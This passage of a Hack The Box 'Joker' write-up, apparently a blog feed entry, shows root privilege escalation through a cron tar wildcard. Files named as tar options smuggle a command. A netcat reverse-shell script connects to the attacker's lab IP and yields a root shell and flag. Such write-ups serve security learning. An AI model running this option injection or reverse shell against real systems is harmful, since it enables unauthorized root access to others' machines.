+&lt;p&gt;Inside of alekos’ home directory are two interesting directorys, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;development&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backup&lt;/code&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backup&lt;/code&gt; is a folder containing backups of what looks to be the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;development&lt;/code&gt; folder which based off timestamps is running every five minutes. We can also see the tar files are owned by root.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alekos@joker:~/backup$ ls -lah
+total 496K
+drwxrwx--- 2 root   alekos  12K Apr 26 18:35 .
+drwxr-xr-x 7 alekos alekos 4.0K May 19  2017 ..
+-rw-r----- 1 root   alekos  40K Dec 24  2017 dev-1514134201.tar.gz
+-rw-r----- 1 root   alekos  40K Dec 24  2017 dev-1514134501.tar.gz
+-rw-r----- 1 root   alekos  40K Apr 26 17:50 dev-1587912601.tar.gz
+-rw-r----- 1 root   alekos  40K Apr 26 17:55 dev-1587912901.tar.gz
+-rw-r----- 1 root   alekos  40K Apr 26 18:00 dev-1587913201.tar.gz
+-rw-r----- 1 root   alekos  40K Apr 26 18:05 dev-1587913501.tar.gz
+-rw-r----- 1 root   alekos  40K Apr 26 18:10 dev-1587913801.tar.gz
+-rw-r----- 1 root   alekos  40K Apr 26 18:15 dev-1587914101.tar.gz
+-rw-r----- 1 root   alekos  40K Apr 26 18:20 dev-1587914401.tar.gz
+-rw-r----- 1 root   alekos  40K Apr 26 18:25 dev-1587914701.tar.gz
+-rw-r----- 1 root   alekos  40K Apr 26 18:30 dev-1587915001.tar.gz
+-rw-r----- 1 root   alekos  40K Apr 26 18:35 dev-1587915301.tar.gz
+alekos@joker:~/backup$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Since we don’t have any crontab for Alekos, it seems logical that whatever is running the backup is probably running something like tar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cf *&lt;/code&gt;. Yet again another wildcard we can exploit.&lt;/p&gt;
+
+&lt;p&gt;The options we are going to use are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--checkpoint&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--checkpoint-action&lt;/code&gt;. With tar you can specify checkpoints and a checkpoint action which will run commands at each checkpoint. So all we have to do is set a checkpoint action to run another python UDP shell.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alekos@joker:~$ mv development/ development.bak
+alekos@joker:~$ ln -s /root/ development
+alekos@joker:~$ cd development.bak/
+alekos@joker:~/development.bak$ touch -- --checkpoint=1
+alekos@joker:~/development.bak$ touch -- '--checkpoint-action=exec=sh shell.sh'
+alekos@joker:~/development.bak$ nano shell.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker13.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alekos@joker:~/development.bak$ sed 's/tmp\/f/tmp\/i/g' shell.sh
+#!/bin/bash
+rm /tmp/i
+mkfifo /tmp/i
+cat /tmp/i|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.27 4445 &amp;gt;/tmp/i
+alekos@joker:~/development.bak$ sed 's/tmp\/f/tmp\/i/g' shell.sh -i
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alekos@joker:~/development.bak$ cd ..
+alekos@joker:~$ rm development
+alekos@joker:~$ mv development.bak/ development
+alekos@joker:~$ cd development/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alekos@joker:~/development$ date
+Sun Apr 26 19:41:37 EEST 2020
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo Documenti -&amp;gt; nc -u -lvnp 4445
+listening on [any] 4445 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.10.10.21] 57510
+/bin/sh: 0: can't access tty; job control turned off
+# python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+root@joker:/home/alekos/development# id &amp;amp;&amp;amp; whoami &amp;amp;&amp;amp; cat /root/root.txt
+id &amp;amp;&amp;amp; whoami &amp;amp;&amp;amp; cat /root/root.txt
+uid=0(root) gid=0(root) groups=0(root)
+root
+d452b7faf5fd5b30210f340ef1d4146e
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;hack-only-for-fun-and-learning-not-for-profit&quot;&gt;Hack only for fun and learning. Not for profit&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker14.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>Ezploisite</name><email>bomb@protonmail.com</email></author><category term="Joker" /><category term="Squid-Proxy" /><category term="Sudo Abuse" /><category term="SymLink" /><summary type="html">Joker was a hard box with a Http-Proxy-Squid that allows us through the TFTP to retrieve the username and password. The credentials we retrieve can be used to access the site where, bruteforcing the directories we will find a Python Console. After taking a shell, we will use sudo to create a symlink with our ssh key, to access with the user Alekos. For the privesc we will abuse a crontab which saves archivies as root.</summary></entry></feed>
